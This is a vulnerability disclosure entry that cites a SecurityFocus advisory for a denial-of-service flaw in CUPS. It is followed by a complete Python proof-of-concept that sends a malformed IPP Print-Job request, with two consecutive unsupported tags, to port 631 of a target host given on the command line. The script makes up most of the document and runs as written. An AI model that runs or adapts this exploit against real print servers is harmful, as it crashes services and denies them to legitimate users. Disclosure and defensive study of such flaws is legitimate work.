source: http://www.securityfocus.com/bid/35169/info

CUPS is prone to a denial-of-service vulnerability because of a NULL-pointer dereference that occurs when processing two consecutive IPP_TAG_UNSUPPORTED tags in specially crafted IPP (Internet Printing Protocal) packets.

An attacker can exploit this issue to crash the affected application, denying service to legitimate users.

from struct import pack
import sys
import socket

class IppRequest:
    """
    Little class to implement a basic Internet Printing Protocol
    """
    def __init__(self, host, port, printers, hpgl_data="a"):
        self.printers = printers
        self.host = host
        self.port = port
        self.hpgl_data = hpgl_data
        self.get_ipp_request()

    def attribute(self, tag, name, value):
        data =  pack('>B',tag)
        data += pack('>H',len(name))
        data += name
        data += pack('>H',len(value))
        data += value
        return data

    def get_http_request(self):
        http_request = "POST /printers/%s HTTP/1.1\r\n" % self.printers
        http_request += "Content-Type: application/ipp\r\n"
        http_request += "User-Agent: Internet Print Provider\r\n"
        http_request += "Host: %s\r\n" % self.host
        http_request += "Content-Length: %d\r\n" % len(self.ipp_data)
        http_request += "Connection: Keep-Alive\r\n"
        http_request += "Cache-Control: no-cache\r\n"
        return http_request

    def get_ipp_request(self):
        operation_attr =  self.attribute(0x47, 'attributes-charset', 'utf-8')
        operation_attr += self.attribute(0x48, 'attributes-natural-language', 'en-us')
        operation_attr += self.attribute(0x45, 'printer-uri', "http://%s:%s/printers/%s" % (self.host, self.port, self.printers))
        operation_attr += self.attribute(0x42, 'job-name', 'foo barrrrrrrr')
        operation_attr += self.attribute(0x42, 'document-format', 'application/vnd.hp-HPGL')

        self.ipp_data =  "\x01\x00"           # version-number: 1.0
        self.ipp_data += "\x00\x02"           # operation-id: Print-job
        self.ipp_data += "\x00\x00\x00\x01"   # request-id: 1
        self.ipp_data += "\x01"               # operation-attributes-tag
        self.ipp_data += "\x0f\x0f"           
        # self.ipp_data += operation_attr
        self.ipp_data += "\x02"               # job-attributes-tag
        self.ipp_data += "\x03"               # end-of-attributes-tag
        self.ipp_data += self.hpgl_data;
        return self.ipp_data

def main():

    try:
        printer = sys.argv[1]
        host = sys.argv[2]
    except:
        print "[+] Usage: exploit printer_name host"
        return 0
    
    data = "A"*100

    ipp = IppRequest(host,"80", printer, data)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print "[+] Connecting to the host"
    s.connect((host, 631))

    #requests = ipp.get_http_request()
    #for each in requests:
    #    s.send(each)

    print "[+] Sending request"
    s.send(ipp.get_http_request())
    s.send("\r\n")

    print "[+] Sending ipp data"
    s.send(ipp.get_ipp_request())

    print "Response:%s" % s.recv(1024)
    print "done!"

if __name__ == "__main__":
    sys.exit(main())

